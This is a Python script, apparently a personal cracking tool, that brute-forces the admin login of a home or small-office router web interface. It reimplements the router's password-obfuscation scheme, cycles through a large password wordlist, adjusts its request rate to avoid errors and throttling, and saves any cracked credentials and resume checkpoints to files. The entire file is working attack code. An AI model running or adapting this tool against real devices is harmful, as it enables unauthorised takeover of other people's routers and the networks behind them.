import requests
import hashlib
import time
import base64
import random
from tqdm import tqdm
import os
import datetime
import statistics
from collections import deque

# Setup
router_url = "http://10.141.42.79"
login_info_url = f"{router_url}/goform/GetLoginInfo"
login_url = f"{router_url}/goform/login"

# Common usernames; consider loading from file in future
# usernames = ["admin", "root", "user", "administrator"]
usernames = ["admin"]

password_path = "/Volumes/1TB/cracking/lists/cyclone_hk.txt"

# Optimized wordlist loading
def count_lines(file_path):
    """Count the number of non-empty lines in the file"""
    count = 0
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            if line.strip():
                count += 1
    return count

def load_wordlist(path, batch_size=1000):
    """Load passwords from wordlist in efficient batches"""
    total_passwords = count_lines(path)
    print(f"Wordlist contains {total_passwords} passwords")
    
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        passwords = []
        for line in f:
            password = line.strip()
            if password:
                passwords.append(password)
                if len(passwords) >= batch_size:
                    for pwd in passwords:
                        yield pwd
                    passwords = []
        
        # Yield any remaining passwords
        for pwd in passwords:
            yield pwd

# For tracking router response behavior
response_times = deque(maxlen=20)
error_times = deque(maxlen=10)
request_counter = 0
last_request_time = 0
adaptive_delay = 0  # Milliseconds between requests

def get_login_info():
    global request_counter, last_request_time, adaptive_delay
    
    # Apply adaptive delay
    if adaptive_delay > 0 and last_request_time > 0:
        elapsed = (time.time() - last_request_time) * 1000  # Convert to ms
        if elapsed < adaptive_delay:
            time.sleep((adaptive_delay - elapsed) / 1000)  # Convert back to seconds
    
    for retry in range(3):
        try:
            request_start = time.time()
            last_request_time = request_start
            request_counter += 1
            
            r = requests.get(login_info_url, timeout=5)
            data = r.json()
            
            # Record response time
            resp_time = time.time() - request_start
            response_times.append(resp_time)
            
            if not data or "priKey" not in data or not data["priKey"]:
                raise ValueError("Invalid or empty priKey received from router")
            
            priKey_value = data["priKey"]
            
            # Handle the case where priKey starts with 'x' (like "x12ba")
            if priKey_value.startswith('x'):
                # Use a default value for priKey and extract timestamp
                priKey = "0"  # Default value
                timestamp = priKey_value[1:]  # Remove the 'x' prefix
            else:
                # Normal case: priKey is in format "value1xvalue2"
                parts = priKey_value.split("x")
                if len(parts) != 2:
                    raise ValueError(f"Invalid priKey format: {priKey_value}")
                priKey, timestamp = parts
            
            return priKey, timestamp, int(time.time())
        except Exception as e:
            error_times.append(time.time())
            print(f"⚠️ Error getting login info: {e} - Attempt {retry+1}/3")
            if retry < 2:  # Wait before retrying, except on the last attempt
                time.sleep(2)
    
    # If we reach here, all attempts failed
    raise ConnectionError("Failed to get valid login info after 3 attempts")

def base64_encode_custom(message):
    return base64.b64encode(message.encode()).decode()

def replace_char_at(s, index, char):
    """Replace character at index in string s with char"""
    return s[:index] + char + s[index+1:]

def check_password_type(pwd):
    """Determine the type of password for charset selection"""
    if not pwd:
        return 'mix_all'
    isnum = pwd.isdigit()
    islower = pwd.islower()
    isupper = pwd.isupper()
    isspec = all(not c.isalnum() for c in pwd)
    if isnum:
        return 'number'
    elif islower:
        return 'lower'
    elif isupper:
        return 'upper'
    elif isspec:
        return 'spec'
    elif any(c.isdigit() for c in pwd) and any(c.islower() for c in pwd) and any(c.isupper() for c in pwd):
        return 'alpha_num'
    elif any(c.isalnum() for c in pwd) and any(not c.isalnum() for c in pwd):
        return 'mix_all'
    return 'mix_all'

def get_charset(pwd_type):
    """Get charset based on password type"""
    # For simplicity, use mix_all
    return list("1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&*()_+{}:|'[]?,./-=") * 10

def password_encode(password, secret, timestamp, timestamp_start):
    """Encode password using the same algorithm as the router"""
    # Determine password type and get appropriate charset
    pwd_type = check_password_type(password)
    charset = get_charset(pwd_type)

    # Generate random data for splicing
    num14 = random.randint(1, 4)
    num255 = [random.randint(0, 255) for _ in range(num14)]
    splice_str = ''.join([charset[i % len(charset)] for i in num255])
    splic_pwd = splice_str + password

    # Apply transformations
    parse16 = int(secret, 16)
    for i in range(4):
        idx1 = ((parse16 >> (i * 8)) & 0xff) % len(splic_pwd)
        idx2 = i % len(splic_pwd)
        # Swap characters
        char1 = splic_pwd[idx1]
        char2 = splic_pwd[idx2]
        splic_pwd = replace_char_at(splic_pwd, idx1, char2)
        splic_pwd = replace_char_at(splic_pwd, idx2, char1)

    # Create message with timestamp
    random1 = ''.join([f"{x:02x}" for x in num255])
    time_diff = int(time.time()) - timestamp_start
    time_stamp = int(timestamp, 16) + time_diff
    message = f"{random1}x{time_stamp:x}:{splic_pwd}"
    base64_str = base64_encode_custom(message)

    # Apply further transformations to base64 string
    for i in range(4):
        idx1 = ((parse16 >> (i * 8)) & 0xff) % len(base64_str)
        idx2 = i % len(base64_str)
        # Swap characters
        char1 = base64_str[idx1]
        char2 = base64_str[idx2]
        base64_str = replace_char_at(base64_str, idx1, char2)
        base64_str = replace_char_at(base64_str, idx2, char1)

    return base64_str

def adjust_rate_limiting(success=True):
    """Adjust request rate based on router behavior"""
    global adaptive_delay
    
    # If we have enough response times to analyze
    if len(response_times) >= 5:
        avg_response = statistics.mean(response_times)
        if avg_response > 0.5 and adaptive_delay < 1000:  # If response time is high
            # Increase delay proportionally to response time
            adaptive_delay += int(avg_response * 100)
            return f"Increased delay to {adaptive_delay}ms (slow responses: {avg_response:.2f}s avg)"
    
    # Check for error bursts
    if len(error_times) >= 3:
        recent_errors = [t for t in error_times if time.time() - t < 10]
        if len(recent_errors) >= 3:  # 3+ errors in 10 seconds
            old_delay = adaptive_delay
            adaptive_delay = min(5000, adaptive_delay + 500)  # Add 500ms up to 5 seconds max
            return f"Increased delay to {adaptive_delay}ms (error burst detected)"
    
    # If success and we've completed 50 requests without errors, reduce delay
    if success and request_counter % 50 == 0 and adaptive_delay > 0:
        old_delay = adaptive_delay
        adaptive_delay = max(0, int(adaptive_delay * 0.8))  # Reduce by 20%
        return f"Decreased delay to {adaptive_delay}ms (stable connection)"
    
    return None

def try_login(username, raw_password):
    global last_request_time, adaptive_delay
    
    max_retries = 3
    for attempt in range(max_retries):
        # Apply adaptive delay between requests
        if adaptive_delay > 0 and last_request_time > 0:
            elapsed = (time.time() - last_request_time) * 1000  # Convert to ms
            if elapsed < adaptive_delay:
                time.sleep((adaptive_delay - elapsed) / 1000)  # Convert back to seconds
        
        try:
            # Get login info with retry mechanism built-in
            priKey, timestamp, timestamp_start = get_login_info()
            
            # Start timing the request
            request_start = time.time()
            last_request_time = request_start
            
            # Continue with login attempt
            md5pass = hashlib.md5(raw_password.encode()).hexdigest()
            encoded_pass = password_encode(md5pass, priKey, timestamp, timestamp_start)

            payload = {
                "username": username,
                "password": encoded_pass
            }

            r = requests.post(login_url, json=payload, timeout=5)
            resp = r.json()
            
            # Record successful response time
            resp_time = time.time() - request_start
            response_times.append(resp_time)
            
            # Check result and adjust rate limiting
            if resp.get("retcode") == 0:
                adjust_rate_limiting(success=True)
                return True
            else:
                adjust_rate_limiting(success=True)  # Still a successful request
                return False
                
        except ConnectionError as e:
            # Record error time for rate limiting detection
            error_times.append(time.time())
            
            # If we can't connect to the router, wait longer before retry
            if attempt < max_retries - 1:
                msg = adjust_rate_limiting(success=False)
                wait_time = min(5 * (attempt + 1), 30)  # Progressive backoff
                print(f"⚠️ Connection error with {username}:{raw_password} — {e}")
                if msg:
                    print(f"⚠️ {msg}")
                print(f"⚠️ Waiting {wait_time}s before retry...")
                time.sleep(wait_time)
                
        except Exception as e:
            # Record error time for rate limiting detection
            error_times.append(time.time())
            
            if attempt < max_retries - 1:
                msg = adjust_rate_limiting(success=False)
                wait_time = min(2 * (attempt + 1), 10)  # Progressive backoff
                print(f"⚠️ Error with {username}:{raw_password} — {e}")
                if msg:
                    print(f"⚠️ {msg}")
                print(f"⚠️ Retrying in {wait_time}s...")
                time.sleep(wait_time)
    
    # If we reach here, all attempts failed
    print(f"❌ Skipping {username}:{raw_password} after {max_retries} failed attempts")
    return False

# Main execution
if __name__ == "__main__":
    start_time = time.time()
    attempts = 0
    consecutive_errors = 0
    
    # Save session start time for resuming
    session_start = datetime.datetime.now()
    print(f"Starting brute force at {session_start.strftime('%Y-%m-%d %H:%M:%S')}")
    
    # Count total passwords for progress tracking
    try:
        total_passwords = count_lines(password_path)
    except Exception as e:
        print(f"Error counting passwords: {e}")
        total_passwords = 0  # Will show ? in progress bar if unknown
    
    try:
        for username in usernames:
            # Create progress bar for brute force attempts
            with tqdm(total=total_passwords, desc=f"Brute forcing {username}", unit="pwd") as pbar:
                for password in load_wordlist(password_path):
                    attempts += 1
                    
                    try:
                        # Try login and adjust rate limiting adaptively
                        result = try_login(username, password)
                        
                        if result:
                            tqdm.write(f"✅ SUCCESS: {username}:{password}")
                            elapsed = time.time() - start_time
                            tqdm.write(f"Found after {attempts} attempts in {elapsed:.2f} seconds")
                            
                            # Save successful credentials to file
                            with open("successful_login.txt", "w") as f:
                                f.write(f"Username: {username}\n")
                                f.write(f"Password: {password}\n")
                                f.write(f"Found at: {datetime.datetime.now()}\n")
                                f.write(f"Attempts: {attempts}\n")
                                f.write(f"Time taken: {elapsed:.2f} seconds\n")
                            
                            exit(0)
                        else:
                            consecutive_errors = 0  # Reset on successful (but wrong) login
                            if attempts % 10 == 0:  # Only update display occasionally to reduce overhead
                                elapsed = time.time() - start_time
                                rate = attempts / elapsed if elapsed > 0 else 0
                                status = f"❌ Failed: {username}:{password} | {rate:.2f} attempts/sec"
                                if adaptive_delay > 0:
                                    status += f" | Delay: {adaptive_delay}ms"
                                tqdm.write(status)
                    
                    except Exception as e:
                        consecutive_errors += 1
                        tqdm.write(f"❌ Unhandled error: {e}")
                        
                        # Exponential backoff if too many consecutive errors
                        if consecutive_errors >= 5:
                            delay = min(30, 2 ** (consecutive_errors - 5))
                            tqdm.write(f"⚠️ {consecutive_errors} consecutive errors, backing off for {delay}s")
                            time.sleep(delay)
                    
                    # Always update progress bar
                    pbar.update(1)
                    
                    # If keyboard interrupt, save progress
                    if attempts % 50 == 0:
                        # Optionally save checkpoint
                        pass
            
        print(f"Exhausted wordlist. Tried {attempts} passwords in {time.time() - start_time:.2f} seconds")
    
    except KeyboardInterrupt:
        print("\nBrute force interrupted by user.")
        elapsed = time.time() - start_time
        print(f"Tried {attempts} passwords in {elapsed:.2f} seconds ({attempts/elapsed:.2f} pwd/sec)")
        print(f"Last password tried: {username}:{password}")
        
        # Save checkpoint
        with open("brute_force_checkpoint.txt", "w") as f:
            f.write(f"username={username}\n")
            f.write(f"last_password={password}\n")
            f.write(f"attempts={attempts}\n")
            f.write(f"timestamp={datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        
        print("Checkpoint saved. To resume, modify the script to start from this password.")
        